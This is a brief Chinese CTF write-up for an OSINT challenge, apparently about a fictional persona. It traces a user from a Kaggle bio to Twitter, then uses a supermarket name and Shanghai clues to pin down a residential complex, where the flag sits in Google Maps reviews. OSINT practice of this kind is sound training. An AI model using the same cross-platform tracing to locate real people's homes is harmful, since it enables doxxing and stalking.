最终在kaggle这一数据发掘和预测竞赛的在线平台发现该用户,发现在Bio中有一个用户名,在推特上发现该用户名并且信息与题目相符

![img](https://rvu5pcz1il.feishu.cn/space/api/box/stream/download/asynccode/?code=NDczOTQ1NTlkODlkMzZlZTQzYzY3YTllMGRhNzFlNGNfUVJCZXBZT0tMY0xrdzl3QnlBTW01RWNaMjJNUGJsM29fVG9rZW46Ym94Y25jS2tlV0RNQlFXQWFTNEpTbjVBMDBlXzE2NTAyMDkxMjA6MTY1MDIxMjcyMF9WNA)

通过超市名"夫果品生鲜超市"与复旦位于上海等信息搜索得到该小区为花山名苑

![img](https://rvu5pcz1il.feishu.cn/space/api/box/stream/download/asynccode/?code=N2VjMjQ2MTViN2MwYTcxZTQzMmNjYTU5YmUzM2ZmZmFfallENXoyVGNiSGZCS0lJV2tjQlhJVEUyNzIxaTBCdTZfVG9rZW46Ym94Y241NWY4NnhETWNGYmtrUG5VdkRiV2VnXzE2NTAyMDkxMjA6MTY1MDIxMjcyMF9WNA)

最终通过了无尽的搜索,最终在google地图的花山名苑的评论区发现了flag

![img](https://rvu5pcz1il.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDQwMGFmZWJkNzc4OGJiNTFlYjQ3NmM4ZTczZjU1OWVfeDdOcEVTbUw3ME5zTk4wMzlHODVtMjNsZ1lYVUVTUW1fVG9rZW46Ym94Y25WSTR6dlZWclZBUG45UjIzenExMlhBXzE2NTAyMDkxMjA6MTY1MDIxMjcyMF9WNA)